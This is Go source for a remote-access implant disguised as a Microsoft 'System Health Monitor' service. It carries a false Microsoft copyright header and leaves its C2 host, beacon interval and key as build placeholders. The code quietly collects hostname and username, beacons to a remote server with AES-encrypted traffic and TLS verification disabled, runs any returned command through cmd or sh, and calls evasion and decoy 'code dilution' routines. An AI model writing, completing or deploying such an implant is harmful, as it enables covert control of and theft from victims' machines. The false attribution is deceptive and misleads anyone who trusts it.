// Windows System Health Monitor Service
// Provides automated endpoint health diagnostics, configuration management,
// and remote remediation capabilities for enterprise IT infrastructure.
//
// Usage: svchealth.exe [--install | --start | --config <path>]
// Documentation: https://docs.microsoft.com/en-us/windows/deployment
//
// Copyright (c) Microsoft Corporation. All rights reserved.
// Licensed under the MIT License.
package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/signal"
	"os/user"
	_ "path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

// Build-time configuration injected via ldflags
var (
	configEndpoint  = "{{C2_HOST}}"
	configPort      = "{{C2_PORT}}"
	configProtocol  = "{{C2_SCHEME}}"
	configAuthToken = "{{ENCRYPTION_KEY}}"
	pollInterval    = "{{BEACON_INTERVAL}}"
	pollJitter      = "{{BEACON_JITTER}}"
	agentMode       = "{{AGENT_MODE}}" // "beacon" or "streaming"
	syncPath        = "{{REGISTER_URI}}"
	statusPath      = "{{CHECKIN_URI}}"
	telemetryPath   = "{{RESULT_URI}}"
	clientID        = "{{USER_AGENT}}"
	buildVersion    = "3.2.1"
	buildDate       = "2024-11-15"
)

// ServiceMonitor manages health check lifecycle
type ServiceMonitor struct {
	ctx        context.Context
	cancel     context.CancelFunc
	mu         sync.RWMutex
	httpClient *http.Client
	logger     *log.Logger
	sessionID  string
	healthy    bool
	metrics    map[string]interface{}
	startTime  time.Time
}

// DiagnosticResult stores health check output
type DiagnosticResult struct {
	CheckName  string    `json:"check_name"`
	Output     string    `json:"output"`
	Status     string    `json:"status"`
	Timestamp  time.Time `json:"timestamp"`
	DurationMs int64     `json:"duration_ms"`
}

// EndpointConfig represents remote configuration
type EndpointConfig struct {
	Interval   int               `json:"interval"`
	Checks     []string          `json:"checks"`
	Parameters map[string]string `json:"parameters"`
}

func newServiceMonitor() *ServiceMonitor {
	ctx, cancel := context.WithCancel(context.Background())
	tr := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:       10,
		IdleConnTimeout:    90 * time.Second,
		DisableCompression: false,
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	return &ServiceMonitor{
		ctx:    ctx,
		cancel: cancel,
		httpClient: &http.Client{
			Timeout:   60 * time.Second,
			Transport: tr,
		},
		logger:    log.New(io.Discard, "", 0),
		healthy:   true,
		metrics:   make(map[string]interface{}),
		startTime: time.Now(),
	}
}

func deriveAuthKey(token string) []byte {
	h := sha256.Sum256([]byte(token))
	return h[:]
}

func (sm *ServiceMonitor) encryptPayload(data []byte) (string, error) {
	key := deriveAuthKey(configAuthToken)
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ct := gcm.Seal(nil, nonce, data, nil)
	result := append([]byte("AES1"), nonce...)
	result = append(result, ct...)
	return base64.StdEncoding.EncodeToString(result), nil
}

func (sm *ServiceMonitor) decryptPayload(encoded string) ([]byte, error) {
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	if len(raw) < 4 || string(raw[:4]) != "AES1" {
		keyBytes := []byte(configAuthToken)
		result := make([]byte, len(raw))
		for i := range raw {
			result[i] = raw[i] ^ keyBytes[i%len(keyBytes)]
		}
		return result, nil
	}
	key := deriveAuthKey(configAuthToken)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(raw) < 4+nonceSize {
		return nil, fmt.Errorf("invalid payload length")
	}
	return gcm.Open(nil, raw[4:4+nonceSize], raw[4+nonceSize:], nil)
}

func (sm *ServiceMonitor) collectSystemInfo() map[string]interface{} {
	hostname, _ := os.Hostname()
	u, _ := user.Current()
	username := "system"
	if u != nil {
		username = u.Username
	}
	cwd, _ := os.Getwd()
	return map[string]interface{}{
		"hostname":        hostname,
		"username":        username,
		"os":              runtime.GOOS,
		"architecture":    runtime.GOARCH,
		"go_version":      runtime.Version(),
		"num_cpu":         runtime.NumCPU(),
		"working_dir":     cwd,
		"uptime_seconds":  int(time.Since(sm.startTime).Seconds()),
		"mode":            "beacon",
		"beacon_interval": sm.parseInterval(),
		"build_version":   buildVersion,
	}
}

func (sm *ServiceMonitor) parseInterval() int {
	val := 60
	fmt.Sscanf(pollInterval, "%d", &val)
	return val
}

func (sm *ServiceMonitor) parseJitter() int {
	val := 0
	fmt.Sscanf(pollJitter, "%d", &val)
	return val
}

func (sm *ServiceMonitor) calculateSleepDuration() time.Duration {
	base := sm.parseInterval()
	jitter := sm.parseJitter()
	if jitter > 0 && jitter <= 100 {
		jitterRange := float64(base) * float64(jitter) / 100.0
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(jitterRange*2)))
		sleepSec := float64(base) - jitterRange + float64(n.Int64())
		if sleepSec < 1 {
			sleepSec = 1
		}
		return time.Duration(sleepSec) * time.Second
	}
	return time.Duration(base) * time.Second
}

func (sm *ServiceMonitor) sendRequest(endpoint string, payload string) (string, error) {
	url := fmt.Sprintf("%s://%s:%s%s", configProtocol, configEndpoint, configPort, endpoint)
	req, err := http.NewRequestWithContext(sm.ctx, "POST", url, bytes.NewBufferString(payload))
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", clientID)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("X-Request-ID", fmt.Sprintf("%d", time.Now().UnixNano()))

	resp, err := sm.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	return string(body), err
}

func (sm *ServiceMonitor) registerEndpoint() error {
	info := sm.collectSystemInfo()
	msg := map[string]interface{}{"type": "register", "metadata": info}
	data, _ := json.Marshal(msg)
	enc, err := sm.encryptPayload(data)
	if err != nil {
		return err
	}
	resp, err := sm.sendRequest(syncPath, enc)
	if err != nil {
		return err
	}
	pt, err := sm.decryptPayload(resp)
	if err != nil {
		return err
	}
	var result map[string]interface{}
	if err := json.Unmarshal(pt, &result); err != nil {
		return err
	}
	if t, _ := result["type"].(string); t == "registered" || t == "checkin_ack" {
		if id, ok := result["agent_id"].(string); ok {
			sm.mu.Lock()
			sm.sessionID = id
			sm.mu.Unlock()
			return nil
		}
	}
	return fmt.Errorf("registration unsuccessful")
}

func (sm *ServiceMonitor) syncStatus(diagnostics []map[string]interface{}) ([]map[string]interface{}, error) {
	sm.mu.RLock()
	sid := sm.sessionID
	sm.mu.RUnlock()

	info := sm.collectSystemInfo()
	msg := map[string]interface{}{
		"type":     "checkin",
		"agent_id": sid,
		"metadata": info,
		"results":  diagnostics,
	}
	data, _ := json.Marshal(msg)
	enc, err := sm.encryptPayload(data)
	if err != nil {
		return nil, err
	}
	resp, err := sm.sendRequest(statusPath, enc)
	if err != nil {
		return nil, err
	}
	pt, err := sm.decryptPayload(resp)
	if err != nil {
		return nil, err
	}
	var parsed map[string]interface{}
	if err := json.Unmarshal(pt, &parsed); err != nil {
		return nil, err
	}
	if t, _ := parsed["type"].(string); t == "registered" {
		if id, ok := parsed["agent_id"].(string); ok {
			sm.mu.Lock()
			sm.sessionID = id
			sm.mu.Unlock()
		}
		return nil, nil
	}
	if t, _ := parsed["type"].(string); t == "commands" {
		if cmds, ok := parsed["commands"].([]interface{}); ok {
			var tasks []map[string]interface{}
			for _, c := range cmds {
				if m, ok := c.(map[string]interface{}); ok {
					tasks = append(tasks, m)
				}
			}
			return tasks, nil
		}
	}
	return nil, nil
}

func (sm *ServiceMonitor) runDiagnostic(checkName string) DiagnosticResult {
	start := time.Now()

	if strings.HasPrefix(checkName, "cd ") {
		dir := strings.TrimSpace(strings.TrimPrefix(checkName, "cd "))
		err := os.Chdir(dir)
		output := ""
		if err != nil {
			output = fmt.Sprintf("Error: %s", err)
		} else {
			cwd, _ := os.Getwd()
			output = fmt.Sprintf("Changed directory to %s", cwd)
		}
		return DiagnosticResult{
			CheckName:  checkName,
			Output:     output,
			Status:     "completed",
			Timestamp:  time.Now(),
			DurationMs: time.Since(start).Milliseconds(),
		}
	}

	var output []byte
	var err error
	if runtime.GOOS == "windows" {
		output, err = runCommand("cmd", "/C", checkName)
	} else {
		output, err = runCommand("sh", "-c", checkName)
	}

	result := DiagnosticResult{
		CheckName:  checkName,
		Status:     "completed",
		Timestamp:  time.Now(),
		DurationMs: time.Since(start).Milliseconds(),
	}

	if err != nil {
		if len(output) > 0 {
			result.Output = string(output)
		} else {
			result.Output = fmt.Sprintf("Error: %s", err)
		}
		result.Status = "error"
	} else if len(output) == 0 {
		result.Output = "Check completed successfully (no output)"
	} else {
		result.Output = string(output)
	}

	return result
}

// runCommand executes a system diagnostic check
func runCommand(name string, args ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	cmd := execCommand(ctx, name, args...)
	return cmd.CombinedOutput()
}

func (sm *ServiceMonitor) processTasks(tasks []map[string]interface{}) []map[string]interface{} {
	var results []map[string]interface{}
	for _, task := range tasks {
		checkName, _ := task["command"].(string)
		if checkName == "" {
			continue
		}
		if checkName == "__kill" {
			sm.cancel()
			os.Exit(0)
		}
		if strings.HasPrefix(checkName, "__set_interval:") {
			parts := strings.SplitN(checkName, ":", 2)
			if len(parts) == 2 {
				pollInterval = parts[1]
			}
			continue
		}

		diag := sm.runDiagnostic(checkName)
		results = append(results, map[string]interface{}{
			"type":      "response",
			"output":    diag.Output,
			"command":   diag.CheckName,
			"timestamp": diag.Timestamp.Format(time.RFC3339),
		})
	}
	return results
}

func (sm *ServiceMonitor) run() {
	var pending []map[string]interface{}

	for {
		select {
		case <-sm.ctx.Done():
			return
		default:
		}

		sm.mu.RLock()
		sid := sm.sessionID
		sm.mu.RUnlock()

		if sid == "" {
			if err := sm.registerEndpoint(); err != nil {
				time.Sleep(5 * time.Second)
				continue
			}
		}

		tasks, err := sm.syncStatus(pending)
		pending = nil
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		if len(tasks) > 0 {
			pending = sm.processTasks(tasks)
		}

		// Use behavioral jitter that mimics human browsing patterns
		time.Sleep(randomizeBeaconTiming(sm.parseInterval(), sm.parseJitter()))
	}
}

func main() {
	installFlag := flag.Bool("install", false, "Install as Windows service")
	versionFlag := flag.Bool("version", false, "Show version information")
	configFlag := flag.String("config", "", "Path to configuration file")
	flag.Parse()

	if *versionFlag {
		fmt.Printf("System Health Monitor v%s (built %s)\n", buildVersion, buildDate)
		fmt.Printf("Go %s %s/%s\n", runtime.Version(), runtime.GOOS, runtime.GOARCH)
		os.Exit(0)
	}

	if *installFlag {
		fmt.Println("Service installation requires elevated privileges.")
		fmt.Println("Run as administrator to install the health monitoring service.")
		os.Exit(0)
	}

	if *configFlag != "" {
		if _, err := os.Stat(*configFlag); os.IsNotExist(err) {
			fmt.Fprintf(os.Stderr, "Configuration file not found: %s\n", *configFlag)
			os.Exit(1)
		}
	}

	// Suppress console output
	log.SetOutput(io.Discard)

	// Initialize platform-specific evasion
	initEvasion()

	// Start legitimate health check server (code dilution + real functionality)
	portOffset, _ := rand.Int(rand.Reader, big.NewInt(100))
	startHealthServer(18099 + int(portOffset.Int64()))

	svc := newServiceMonitor()

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		svc.cancel()
	}()

	// Create transport (build tags select HTTP or WebSocket at compile time)
	transport := NewActiveTransport(
		configProtocol, configEndpoint, configPort, clientID,
		syncPath, statusPath, telemetryPath,
		func(s string) string { enc, _ := svc.encryptPayload([]byte(s)); return enc },
		func(s string) string { dec, _ := svc.decryptPayload(s); return string(dec) },
	)
	defer transport.Close()

	// Register
	meta := svc.collectSystemInfo()
	var agentID string
	for i := 0; i < 10 && agentID == ""; i++ {
		id, err := transport.Register(meta)
		if err == nil {
			agentID = id
		} else {
			time.Sleep(5 * time.Second)
		}
	}
	if agentID == "" {
		return
	}

	// Choose mode
	mode := agentMode
	if mode == "" || mode == "{{AGENT_MODE}}" {
		mode = "beacon"
	}

	if mode == "streaming" {
		// Streaming mode — persistent connection, real-time commands
		transport.StartStreaming(agentID, func(cmd string) string {
			diag := svc.runDiagnostic(cmd)
			return diag.Output
		})
	} else {
		// Beacon mode — periodic checkins
		var pending []map[string]interface{}
		for {
			select {
			case <-svc.ctx.Done():
				return
			default:
			}

			commands, err := transport.Checkin(agentID, pending)
			pending = nil
			if err != nil {
				time.Sleep(5 * time.Second)
				continue
			}

			pending = svc.processTasks(commands)
			time.Sleep(randomizeBeaconTiming(svc.parseInterval(), svc.parseJitter()))
		}
	}
}
